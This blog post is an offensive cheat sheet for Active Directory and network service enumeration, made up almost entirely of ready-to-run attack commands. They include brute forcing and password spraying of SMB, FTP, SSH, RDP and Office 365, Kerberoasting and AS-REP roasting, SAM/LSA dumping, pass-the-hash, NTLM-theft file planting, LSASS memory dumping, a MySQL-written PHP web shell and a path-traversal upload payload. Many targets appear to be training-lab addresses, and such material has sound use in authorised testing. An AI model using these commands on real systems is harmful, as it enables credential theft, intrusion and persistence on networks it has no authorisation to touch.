---
author: pl4int3xt
layout: post
title: Active Directory Enumeration
date: '2023-11-13 05:53:29 +0300'
cover: img/cover_images/44.png
description: "Active directory Enumeration 101"
categories: [Active Directory, Enumeration]
---

## Enumeration with No creds
### Smb enumeration
```bash
smbmap -H <ip>
smbmap -u 'guest' -p '' -H <ip>
smbclient -L <ip> -u ''
smbclient //<ip>/<share> -c 'recurse;ls'
cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
cme smb 10.10.10.178 -u 'a' -p ''
rpcclient -U '' -N <ip>
enumdomusers
querydispinfo
hydra -L user.list -P password.list smb://10.129.42.197
scanner/smb/smb_login
```
### FTP enumeration
```bash
ftp <IP>
nc -nv <IP> 21
wget -m --no-passive ftp://anonymous:anonymous@<target>
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142
```
[CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "Payload" --path-as-is https://<IP>/../../../../../../reverse
```
#### FTP bounce back
```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
### SNMP enumeration
```bash
snmpwalk -v2c -c public 10.129.14.128
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
braa public@10.129.14.128:.1.3.6.*
```
### DNS enumeration
```bash
fierce --domain zonetransfer.me
dig +short ns zonetransfer.me
dig +short any zonetransfer.me
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
gobuster dns -q -r "d.ns.facebook.com" -d "facebook.com" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"
```
#### Domain Takeovers & Subdomain Enumeration
```bash
echo "ns1.inlanefreight.com" >> ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
./subfinder -d inlanefreight.com -v
host support.inlanefreight.com
```
### Ldap enumeration
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <ip>
ldapsearch -H ldap://<ip> -x -s base namingcontext
ldapsearch -H ldap://<ip> -x -b"DC=htb,DC=local"
```
### SMTP enumeration
```bash
telnet 10.129.14.128 25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
python3 smtp_vrfy_brute.py 10.129.191.82 ~/Documents/seclists/footprinting-wordlist.txt
smtp-user-enum -V -m RCPT -U ~/Documents/seclists/footprinting-wordlist.txt 10.129.42.195 25
use auxiliary/scanner/smtp/smtp_enum
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.122.129
```
### RDP enumeration
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
./rdp-sec-check.pl 10.129.201.248
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
hydra -L user.list -P password.list rdp://10.129.42.197
```
### MSSQL
```bash
mssqlclient.py -p 1433 backdoor@10.129.201.248 -windows-auth
select name from sys.databases
use scanner/mssql/mssql_ping
```
### ORACLE TNS
```bash
oscanner -s <IP> -P <PORT>
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
./odat.py all -s 10.129.204.235
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;
```
#### File upload
```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```
### IPMI enumeration
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### SSH enumeration
```bash
./ssh-audit.py 10.129.14.132
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
hydra -L user.list -P password.list -u -f ssh://10.129.42.197 -t 4
```
#### Rsync
```bash
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```
### WINRM
```bash
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
### Network poisoning
```bash
responder -I tun0
```
### Extract possible usernames
``` NameSurname, Name.Surname, NamSur, Nam.Sur, NSurname, N.Surname, SurnameName, Surname.Name, SurnameN, Surname.N ```
### Kerbrute
```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.real='test.local', userdb=usernames.txt <ip>
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
### NTLM Creds
```bash
sudo mount -t cifs -o 'user=pl4int3xt' //10.10.10.100/Department /mnt/sync
ls /mnt/sync -laR
```
[smcacls documentation](https://lists.samba.org/archive/samba-technical/2010-June/071390.html)
```bash
for i in $(ls /mnt/sync); do echo; smbcacls --no-pass //10.10.10.100/Department $i
```
[ntlm theft](https://github.com/Greenwolf/ntlm_theft)
```bash
responder -I tun0
python3 ntlm_theft.py -g all -s 10.10.10.100 -f test
cp test/* /mnt/sync/writable_share 
```
## Brute Forcing User RIDs
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
## Enumerating with creds
### Extract SAM and LSA
```bash
crackmapexec smb 10.10.110.17 --local-auth -u administrator -p 'Password123!' --sam
crackmapexec smb 10.129.42.198 --local-auth -u user -p password --lsa
```
### PTH
```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
### Shares 
```bash
cme smb 192.168.1.0/24 -u user -p 'password' --shares
```
### Domain users 
```bash
cme smb 192.168.1.0/24 -u user -p 'password' --users
cme smb 192.168.1.0/24 -u user -p 'password' --rid-brute
```
### Kerberoasting
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 <DOMAIN.FULL>/<USERNAME> -outputfile hashes
cme ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt
```
### ASREPRoast
```bash
GetNPUsers.py -userfilr users.txt -dc-ip <ip> --outputfile ASREPHash -request '<domain>/'
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u user -p pass --asreproast output.txt
```
### Getusers
```bash
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
```
### Enumerate domain password policy
```bash
cme smb 192.168.1.0/24 -u username -p 'password' --pass-pol
```
### Password spray
```bash
crackmapexec smb --local-auth 10.10.10.10/23 -u userlist -p userlist --continue-on-success 
crackmapexec smb --local-auth 10.10.10.10/23 -u userlist -p 'PassworSpray' --continue-on-success 
cme smb --local-auth 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes
cme mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
cme ftp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
cme wmi 192.168.1.0/24 -u userfile -p passwordfile
```
### MSSQL
```bash
cme mssql <ip> -u user -p password -M mssql_priv
cme mssql 10.10.10.59 -u user -p 'password' --local-auth -x whoami
cme mssql 10.10.10.52 -u user -p 'password' --put-file  --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
crackmapexec winrm -u test -p test --continue-on-success 10.10.10.100
crackmapexec smb --local-auth 10.10.10.10/23 -u user -H hash 
evil-winrm -i 10.10.10.100 -u test -p password123
USE nameDb;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
SELECT * FROM tb_USERS;
```
```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\xampp\htdocs\webshell.php';
mysql> select LOAD_FILE("/etc/passwd");
```
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
select LOAD_FILE("C:\\Users\\Administrator\\Desktop\\flag.txt");
```
## NFS
```bash
showmount -e 10.129.171.59
sudo mount -t nfs 10.129.171.59:/ ~/Documents/target-NFS/ -o nolock
sudo umount ~/Documents/target-NFS/
```
## RDP pth
```bash
xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/pl4int3xt /dynamic-resolution
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
rdesktop -u admin -p password123 192.168.2.143
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa   DisableRestrictedAdmin
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
## IMAP/POP3
```bash
openssl s_client -connect 10.129.42.195:imaps
openssl s_client -connect 10.129.42.195:pop3s
```
```bash
A1 LOGIN username password
A1 LIST "" "*"
A1 SELECT "INBOX"
1 FETCH 1 all
1 FETCH 1 BODY[]
```
```bash
USER username
PASS password
LIST
RETR 1
QUIT
```
[Bluekeep CVE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
## WMI
```bash
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```
## LSASS
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
## INFO GATHERING
[crt.sh](https://crt.sh)